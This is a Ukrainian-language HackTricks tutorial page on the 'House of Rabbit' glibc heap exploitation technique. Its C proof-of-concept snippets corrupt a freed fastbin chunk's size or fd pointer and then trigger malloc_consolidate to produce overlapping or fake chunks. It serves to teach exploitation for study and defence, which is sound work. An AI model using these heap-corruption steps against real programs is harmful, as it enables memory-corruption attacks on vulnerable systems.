# –ë—É–¥–∏–Ω–æ–∫ –∫—Ä–æ–ª–∏–∫–∞

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –≤–∑–ª–æ–º GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

### –í–∏–º–æ–≥–∏

1. **–ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ fd –∞–±–æ —Ä–æ–∑–º—ñ—Ä fast bin**: –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –≤–ø–µ—Ä–µ–¥–Ω—ñ–π –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ —à–º–∞—Ç–∫–∞ –≤ fastbin –∞–±–æ –π–æ–≥–æ —Ä–æ–∑–º—ñ—Ä.
2. **–ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–ª–∏–∫–∞—Ç–∏ `malloc_consolidate`**: –¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∞–±–æ –≤–∏–¥—ñ–ª–∏–≤—à–∏ –≤–µ–ª–∏–∫–∏–π —à–º–∞—Ç–æ–∫, –∞–±–æ –æ–±'—î–¥–Ω–∞–≤—à–∏ –≤–µ—Ä—Ö–Ω—ñ–π —à–º–∞—Ç–æ–∫, —â–æ –∑–º—É—à—É—î –∫—É–ø—É –æ–±'—î–¥–Ω—É–≤–∞—Ç–∏ —à–º–∞—Ç–∫–∏.

### –¶—ñ–ª—ñ

1. **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–µ—Ä–µ–∫—Ä–∏–≤–∞—é—á–∏—Ö—Å—è —à–º–∞—Ç–∫—ñ–≤**: –ú–∞—Ç–∏ –æ–¥–∏–Ω —à–º–∞—Ç–æ–∫, —è–∫–∏–π –ø–µ—Ä–µ–∫—Ä–∏–≤–∞—î—Ç—å—Å—è –∑ —ñ–Ω—à–∏–º, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ–¥–∞–ª—å—à—ñ –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó –∫—É–ø–æ—é.
2. **–§–∞–ª—å—à–∏–≤—ñ —à–º–∞—Ç–∫–∏**: –û–±–º–∞–Ω—É—Ç–∏ –∞–ª–æ–∫–∞—Ç–æ—Ä, —â–æ–± –≤—ñ–Ω —Ä–æ–∑–≥–ª—è–¥–∞–≤ —Ñ–∞–ª—å—à–∏–≤–∏–π —à–º–∞—Ç–æ–∫ —è–∫ –∑–∞–∫–æ–Ω–Ω–∏–π –ø—ñ–¥ —á–∞—Å –æ–ø–µ—Ä–∞—Ü—ñ–π –∑ –∫—É–ø–æ—é.

## –ö—Ä–æ–∫–∏ –∞—Ç–∞–∫–∏

### POC 1: –ó–º—ñ–Ω–∞ —Ä–æ–∑–º—ñ—Ä—É —à–º–∞—Ç–∫–∞ fast bin

**–ú–µ—Ç–∞**: –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–µ—Ä–µ–∫—Ä–∏–≤–∞—é—á–æ–≥–æ —à–º–∞—Ç–∫–∞ —à–ª—è—Ö–æ–º –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è —Ä–æ–∑–º—ñ—Ä–æ–º —à–º–∞—Ç–∫–∞ fastbin.

* **–ö—Ä–æ–∫ 1: –í–∏–¥—ñ–ª–µ–Ω–Ω—è —à–º–∞—Ç–∫—ñ–≤**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **–ö—Ä–æ–∫ 2: –ó–≤—ñ–ª—å–Ω–µ–Ω–Ω—è —á–∞–Ω–∫—ñ–≤**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **–ö—Ä–æ–∫ 3: –ó–º—ñ–Ω–∏—Ç–∏ –†–æ–∑–º—ñ—Ä –ß–∞—Å—Ç–∏–Ω–∏**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
–ú–∏ –∑–º—ñ–Ω—é—î–º–æ –º–µ—Ç–∞–¥–∞–Ω—ñ —Ä–æ–∑–º—ñ—Ä—É `chunk1` –Ω–∞ 0xa1. –¶–µ –∫–ª—é—á–æ–≤–∏–π –∫—Ä–æ–∫ –¥–ª—è –æ–±–º–∞–Ω—É –∞–ª–æ–∫–∞—Ç–æ—Ä–∞ –ø—ñ–¥ —á–∞—Å –∫–æ–Ω—Å–æ–ª—ñ–¥–∞—Ü—ñ—ó.

* **–ö—Ä–æ–∫ 4: –í–∏–∫–ª–∏–∫–∞—Ç–∏ `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
–í–∏–¥—ñ–ª–µ–Ω–Ω—è –≤–µ–ª–∏–∫–æ–≥–æ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞ —Å–ø—Ä–∏—á–∏–Ω—è—î –≤–∏–∫–ª–∏–∫ —Ñ—É–Ω–∫—Ü—ñ—ó `malloc_consolidate`, —è–∫–∞ –æ–±'—î–¥–Ω—É—î –Ω–µ–≤–µ–ª–∏–∫—ñ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∏ —É —à–≤–∏–¥–∫–æ–º—É –±–ª–æ—Ü—ñ. –ó–º—ñ–Ω–µ–Ω–∏–π —Ä–æ–∑–º—ñ—Ä `chunk1` –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø–µ—Ä–µ–∫—Ä–∏—Ç—Ç—è –∑ `chunk2`.

–ü—ñ—Å–ª—è –∫–æ–Ω—Å–æ–ª—ñ–¥–∞—Ü—ñ—ó `chunk1` –ø–µ—Ä–µ–∫—Ä–∏–≤–∞—î—Ç—å—Å—è –∑ `chunk2`, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ–¥–∞–ª—å—à—É –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é.

### POC 2: –ó–º—ñ–Ω–∞ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∞ `fd`

**–ú–µ—Ç–∞**: –°—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞ —à–ª—è—Ö–æ–º –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–º `fd` —à–≤–∏–¥–∫–æ–≥–æ –±–ª–æ–∫—É.

* **–ö—Ä–æ–∫ 1: –í–∏–¥—ñ–ª–µ–Ω–Ω—è —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ñ–≤**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**–ü–æ—è—Å–Ω–µ–Ω–Ω—è**: –ú–∏ –≤–∏–¥—ñ–ª—è—î–º–æ –¥–≤–∞ –±–ª–æ–∫–∏, –æ–¥–∏–Ω –º–µ–Ω—à–∏–π —ñ –æ–¥–∏–Ω –±—ñ–ª—å—à–∏–π, —â–æ–± –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –∫—É–ø—É –¥–ª—è —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ –±–ª–æ–∫—É.

* **–ö—Ä–æ–∫ 2: –°—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ –±–ª–æ–∫—É**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **–ö—Ä–æ–∫ 3: –ó–≤—ñ–ª—å–Ω–µ–Ω–Ω—è `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**–ü–æ—è—Å–Ω–µ–Ω–Ω—è**: –ú–∏ –≤–∏–≤—ñ–ª—å–Ω—è—î–º–æ `chunk1`, –¥–æ–¥–∞—é—á–∏ –π–æ–≥–æ –¥–æ —Å–ø–∏—Å–∫—É fastbin.

* **–ö—Ä–æ–∫ 4: –ó–º—ñ–Ω—é—î–º–æ `fd` `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**–ü–æ—è—Å–Ω–µ–Ω–Ω—è**: –ú–∏ –∑–º—ñ–Ω—é—î–º–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –≤–ø–µ—Ä–µ–¥ (`fd`) `chunk1`, —â–æ–± –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ –Ω–∞—à —Ñ–∞–ª—å—à–∏–≤–∏–π —á–∞–Ω–∫ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ `chunk2`.

* **–ö—Ä–æ–∫ 5: –í–∏–∫–ª–∏–∫–∞—Ç–∏ `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
–í–∏–¥—ñ–ª–µ–Ω–Ω—è –≤–µ–ª–∏–∫–æ–≥–æ —à–º–∞—Ç–∫–∞ –∑–Ω–æ–≤—É —Å–ø—Ä–∏—á–∏–Ω—é—î –≤–∏–∫–ª–∏–∫ `malloc_consolidate`, —è–∫–∏–π –æ–±—Ä–æ–±–ª—è—î —Ñ–µ–π–∫–æ–≤–∏–π —à–º–∞—Ç–æ–∫.

–§–µ–π–∫–æ–≤–∏–π —à–º–∞—Ç–æ–∫ —Å—Ç–∞—î —á–∞—Å—Ç–∏–Ω–æ—é —Å–ø–∏—Å–∫—É fastbin, —Ä–æ–±–ª—è—á–∏ –π–æ–≥–æ –∑–∞–∫–æ–Ω–Ω–∏–º —à–º–∞—Ç–∫–æ–º –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó.

### –û–≥–ª—è–¥

–¢–µ—Ö–Ω—ñ–∫–∞ **House of Rabbit** –≤–∫–ª—é—á–∞—î –≤ —Å–µ–±–µ –∑–º—ñ–Ω—É —Ä–æ–∑–º—ñ—Ä—É —à–º–∞—Ç–∫–∞ fast bin –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–µ—Ä–µ–∫—Ä–∏–≤–∞—é—á–∏—Ö—Å—è —à–º–∞—Ç–∫—ñ–≤ –∞–±–æ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–æ–º `fd` –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ–µ–π–∫–æ–≤–∏—Ö —à–º–∞—Ç–∫—ñ–≤. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º —Ñ–∞–ª—å—à–∏–≤–∏—Ç–∏ –∑–∞–∫–æ–Ω–Ω—ñ —à–º–∞—Ç–∫–∏ –≤ –∫—É–ø—ñ, —â–æ –¥–æ–∑–≤–æ–ª—è—î —Ä—ñ–∑–Ω–æ–º–∞–Ω—ñ—Ç–Ω—ñ —Ñ–æ—Ä–º–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó. –†–æ–∑—É–º—ñ–Ω–Ω—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫–∞ —Ü–∏—Ö –∫—Ä–æ–∫—ñ–≤ –ø–æ–∫—Ä–∞—â–∏—Ç—å –≤–∞—à—ñ –Ω–∞–≤–∏—á–∫–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –∫—É–ø–∏.

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –•–∞–∫—ñ–Ω–≥ AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ –•–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
